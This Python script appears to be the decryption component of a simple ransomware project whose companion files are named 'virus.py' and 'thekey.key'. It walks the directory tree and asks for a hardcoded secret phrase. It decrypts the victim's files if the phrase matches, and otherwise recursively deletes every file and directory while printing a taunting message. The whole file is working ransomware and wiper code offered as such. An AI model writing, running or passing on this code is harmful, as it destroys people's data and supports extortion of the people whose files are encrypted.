#!/usr/bin/env python3

import os
import shutil
from cryptography.fernet import Fernet

# Lists to store file paths
files = []
delfiles = []  # Renamed to avoid confusion with the string variable

# Collecting all files that are not the script or key files
for root, dirs, filenames in os.walk("."):  # Walk through all directories and subdirectories
    for file in filenames:
        if file == "virus.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        full_path = os.path.join(root, file)
        files.append(full_path)

# Collecting files and directories to delete
for root, dirs, filenames in os.walk("."):
    for file in filenames:
        full_path = os.path.join(root, file)
        delfiles.append(full_path)
    for dir in dirs:
        full_path = os.path.join(root, dir)
        delfiles.append(full_path)

print("Files to encrypt:", files)
print("Files and directories to delete:", delfiles)

# Read the secret key from the file
with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "aarush"

user_phrase = input("Enter the secret phrase to decrypt your files (take care to put in the password correctly or you will lose all your files permanently):\n")

if user_phrase == secretphrase:
    # Decrypt files in the 'files' list (including those in subdirectories)
    for file in files:
        try:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            print(f"Decrypted file {file}")
        except Exception as e:
            print(f"Failed to decrypt {file}: {e}")
    
    print("Congrats, your files are decrypted. Enjoy your files!")
else:
    print("Sorry, secret phrase. Say bye to your files!!!")
    # Deleting all files and directories in the delfiles list
    for file in delfiles:
        try:
            if os.path.isdir(file):  # If it's a directory, delete it with shutil.rmtree()
                shutil.rmtree(file)
                print(f"Deleted directory {file}")
            elif os.path.isfile(file):  # If it's a file, delete it with os.remove()
                os.remove(file)
                print(f"Deleted file {file}")
        except Exception as e:
            print(f"Failed to delete {file}: {e}")
